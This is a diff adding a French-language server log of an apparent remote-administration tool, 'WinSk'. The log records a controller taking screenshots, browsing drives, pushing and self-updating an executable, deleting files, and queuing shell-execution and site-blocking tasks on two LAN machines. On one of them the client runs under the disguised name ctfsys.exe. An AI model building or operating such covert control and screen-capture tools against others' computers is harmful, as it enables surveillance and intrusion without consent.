@@ -1,0 +1,194 @@
+[18:17:46] information : La socket 112 est maintenant ouverte en mode TCP/IP
+[18:17:46] information : Listage du port 50999...
+[18:18:12] recv : dev-kl
+[18:18:12] ip : 192.168.1.16
+[18:18:20] send : Send_File config
+[18:18:20] start downloading : (1)config.wsk
+[18:18:20] finish downloading : (1)config.wsk 77 bytes received in 1 recv(s)
+[18:18:22] send : List_ToDo
+[18:18:22] from : dev-kl
+[18:18:22] recv : [No ToDo]
+[18:18:28] send : Add_ToDo 30|Shell_Exec notepad
+[18:18:28] from : dev-kl
+[18:18:28] recv : Add_ToDo Success
+[18:18:29] send : List_ToDo
+[18:18:29] from : dev-kl
+[18:18:29] recv : [1]30|Shell_Exec notepad
+[18:18:36] send : Add_ToDo 20|Shell_Exec notepad
+[18:18:36] from : dev-kl
+[18:18:36] recv : Add_ToDo Success
+[18:18:37] send : List_ToDo
+[18:18:37] from : dev-kl
+[18:18:37] recv : [1]30|Shell_Exec notepad[2]20|Shell_Exec notepad
+[18:18:42] send : Free_ToDo
+[18:18:42] from : dev-kl
+[18:18:42] recv : Done !
+[18:18:43] send : List_ToDo
+[18:18:43] from : dev-kl
+[18:18:43] recv : [No ToDo]
+[18:18:53] send : List_ToDo
+[18:18:53] from : dev-kl
+[18:18:53] recv : [No ToDo]
+[18:19:04] send : Send_File tasks
+[18:19:04] start downloading : tasks.wsk
+[18:19:04] finish downloading : tasks.wsk 78 bytes received in 1 recv(s)
+[18:19:08] send : List_ToDo
+[18:19:08] from : dev-kl
+[18:19:08] recv : [No ToDo]
+[18:19:38] send : List_ToDo
+[18:19:38] from : dev-kl
+[18:19:38] recv : [No ToDo]
+[18:20:00] from : dev-kl
+[18:20:00] recv : 
+[18:20:00] information : dev-kl s'est déconnecté !
+[18:25:00] recv : Papa-PAPA-3CB0BE4627
+[18:25:00] ip : 192.168.1.3
+[18:25:14] send : Send_File config
+[18:25:14] start downloading : (1)config.wsk
+[18:25:14] finish downloading : (1)config.wsk 78 bytes received in 1 recv(s)
+[18:25:19] send : Send_Pict 70
+[18:25:20] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-19).jpg
+[18:25:21] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-19).jpg 223806 bytes received in 877 recv(s)
+[18:25:22] send : Send_Pict 70
+[18:25:23] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-22).jpg
+[18:25:23] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-22).jpg 224165 bytes received in 876 recv(s)
+[18:25:25] send : Send_Pict 70
+[18:25:26] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-25).jpg
+[18:25:26] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-25-25).jpg 236401 bytes received in 924 recv(s)
+[18:25:32] send : Explore_Drives
+[18:25:32] from : Papa-PAPA-3CB0BE4627
+[18:25:32] recv : A:\|C:\|D:\|
+[18:25:38] send : Recv_File Z:\mnt\5090EE4690EE3260\2.prg\[API]\WinSk\v 7.0\Serveur\recv\WinSk.exe
+[18:25:38] start uploading : Z:\mnt\5090EE4690EE3260\2.prg\[API]\WinSk\v 7.0\Serveur\recv\WinSk.exe
+[18:25:38] finish uploading : Z:\mnt\5090EE4690EE3260\2.prg\[API]\WinSk\v 7.0\Serveur\recv\WinSk.exe 179356 bytes sent in 701 send(s)
+[18:26:06] send : New_Version_Update D:\\WinSk.exe
+[18:26:06] from : Papa-PAPA-3CB0BE4627
+[18:26:06] recv : Going Update Now, see u !
+[18:26:20] from : Papa-PAPA-3CB0BE4627
+[18:26:20] recv : 
+[18:26:20] information : Papa-PAPA-3CB0BE4627 s'est déconnecté !
+[18:26:36] recv : Papa-PAPA-3CB0BE4627
+[18:26:36] ip : 192.168.1.3
+[18:26:40] send : Explore_Drives
+[18:26:40] from : Papa-PAPA-3CB0BE4627
+[18:26:40] recv : A:\|C:\|D:\|
+[18:26:41] send : Send_File explore->D:\
+[18:26:42] start downloading : explore.wsk
+[18:26:42] finish downloading : explore.wsk 974 bytes received in 4 recv(s)
+[18:26:51] send : File_Opr DELETE D:\WinSk.exe|-
+[18:26:51] from : Papa-PAPA-3CB0BE4627
+[18:26:51] recv : File_Opr Success
+[18:26:51] send : Send_File explore->D:\
+[18:26:52] start downloading : explore.wsk
+[18:26:52] finish downloading : explore.wsk 964 bytes received in 4 recv(s)
+[18:26:57] send : Get_F_Info D:\ctfsys.exe
+[18:26:58] from : Papa-PAPA-3CB0BE4627
+[18:26:58] recv : F_Info>179356|0|1
+[18:27:02] send : Get_F_Info D:\config.wsk
+[18:27:02] from : Papa-PAPA-3CB0BE4627
+[18:27:02] recv : F_Info>78|0|1
+[18:27:04] send : Get_F_Info D:\config-old.wsk
+[18:27:04] from : Papa-PAPA-3CB0BE4627
+[18:27:04] recv : F_Info>78|0|1
+[18:27:11] send : Send_File D:\config-old.wsk
+[18:27:11] start downloading : config-old.wsk
+[18:27:11] finish downloading : config-old.wsk 78 bytes received in 1 recv(s)
+[18:27:13] send : Send_File D:\config.wsk
+[18:27:14] start downloading : (1)config.wsk
+[18:27:14] finish downloading : (1)config.wsk 78 bytes received in 1 recv(s)
+[18:27:21] send : Get_F_Info D:\lecteur.wsk
+[18:27:21] from : Papa-PAPA-3CB0BE4627
+[18:27:21] recv : F_Info>6614|0|1
+[18:27:29] send : Get_F_Info D:\ctfsys.exe
+[18:27:29] from : Papa-PAPA-3CB0BE4627
+[18:27:29] recv : F_Info>179356|0|1
+[18:27:46] send : Explore_Drives
+[18:27:46] from : Papa-PAPA-3CB0BE4627
+[18:27:46] recv : A:\|C:\|D:\|
+[18:27:52] send : Send_File config
+[18:27:52] start downloading : (2)config.wsk
+[18:27:52] finish downloading : (2)config.wsk 78 bytes received in 1 recv(s)
+[18:28:31] send : Send_Pict 70
+[18:28:33] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-31).jpg
+[18:28:34] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-31).jpg 246938 bytes received in 970 recv(s)
+[18:28:34] send : Send_Pict 70
+[18:28:36] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-34).jpg
+[18:28:37] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-34).jpg 245626 bytes received in 968 recv(s)
+[18:28:37] send : Send_Pict 70
+[18:28:39] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-37).jpg
+[18:28:39] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-37).jpg 241539 bytes received in 945 recv(s)
+[18:28:40] send : Send_Pict 70
+[18:28:42] start downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-40).jpg
+[18:28:43] finish downloading : Papa-PAPA-3CB0BE4627-[14-07-2017](18-28-40).jpg 242921 bytes received in 949 recv(s)
+[18:28:52] send : Send_File tasks
+[18:28:52] start downloading : tasks.wsk
+[18:28:52] finish downloading : tasks.wsk 301 bytes received in 2 recv(s)
+[18:28:55] send : List_ToDo
+[18:28:55] from : Papa-PAPA-3CB0BE4627
+[18:28:55] recv : [No ToDo]
+[18:29:20] send : Add_ToDo 30|Block_Site www.example.com
+[18:29:20] from : Papa-PAPA-3CB0BE4627
+[18:29:20] recv : Add_ToDo Success
+[18:29:21] send : List_ToDo
+[18:29:21] from : Papa-PAPA-3CB0BE4627
+[18:29:21] recv : [1]30|Block_Site www.example.com
+[18:29:32] send : Add_ToDo 20|Shell_Exec notepad
+[18:29:32] from : Papa-PAPA-3CB0BE4627
+[18:29:32] recv : Add_ToDo Success
+[18:29:33] send : List_ToDo
+[18:29:33] from : Papa-PAPA-3CB0BE4627
+[18:29:33] recv : [1]30|Block_Site www.example.com[2]20|Shell_Exec notepad
+[18:29:48] send : List_ToDo
+[18:29:48] from : Papa-PAPA-3CB0BE4627
+[18:29:48] recv : [1]29|Block_Site www.example.com[2]19|Shell_Exec notepad
+[18:29:58] send : Free_ToDo
+[18:29:58] from : Papa-PAPA-3CB0BE4627
+[18:29:58] recv : Done !
+[18:29:58] send : List_ToDo
+[18:29:58] from : Papa-PAPA-3CB0BE4627
+[18:29:59] recv : [No ToDo]
+[18:30:05] send : Add_ToDo 15|Shell_Exec notepad
+[18:30:05] from : Papa-PAPA-3CB0BE4627
+[18:30:05] recv : Add_ToDo Success
+[18:30:06] send : List_ToDo
+[18:30:06] from : Papa-PAPA-3CB0BE4627
+[18:30:06] recv : [1]15|Shell_Exec notepad
+[18:30:09] send : Free_ToDo
+[18:30:09] from : Papa-PAPA-3CB0BE4627
+[18:30:09] recv : Done !
+[18:30:10] send : List_ToDo
+[18:30:10] from : Papa-PAPA-3CB0BE4627
+[18:30:10] recv : [No ToDo]
+[18:30:13] send : List_ToDo
+[18:30:13] from : Papa-PAPA-3CB0BE4627
+[18:30:13] recv : [No ToDo]
+[18:30:19] send : List_ToDo
+[18:30:19] from : Papa-PAPA-3CB0BE4627
+[18:30:19] recv : [No ToDo]
+[18:32:00] send : Explore_Drives
+[18:32:00] from : Papa-PAPA-3CB0BE4627
+[18:32:00] recv : A:\|C:\|D:\|
+[18:32:06] send : Explore_Drives
+[18:32:06] from : Papa-PAPA-3CB0BE4627
+[18:32:06] recv : A:\|C:\|D:\|
+[18:32:11] send : Send_File explore->D:\
+[18:32:11] start downloading : explore.wsk
+[18:32:11] finish downloading : explore.wsk 964 bytes received in 4 recv(s)
+[18:32:13] send : Get_F_Info D:\46267a2.pdf
+[18:32:13] from : Papa-PAPA-3CB0BE4627
+[18:32:13] recv : F_Info>64890|0|0
+[18:32:17] send : Get_F_Info D:\ctfsys.exe
+[18:32:17] from : Papa-PAPA-3CB0BE4627
+[18:32:17] recv : F_Info>179356|0|1
+[18:32:25] send : List_ToDo
+[18:32:25] from : Papa-PAPA-3CB0BE4627
+[18:32:25] recv : [No ToDo]
+[18:33:20] send : Send_File config
+[18:33:20] start downloading : config.wsk
+[18:33:20] finish downloading : config.wsk 78 bytes received in 1 recv(s)
+[18:33:50] send : Send_File config
+[18:33:50] start downloading : config.wsk
+[18:33:50] finish downloading : config.wsk 78 bytes received in 1 recv(s)
+[18:33:53] send : Send_File config
+[18:33:54] start downloading : config.wsk
+[18:33:54] finish downloading : config.wsk 78 bytes received in 1 recv(s)
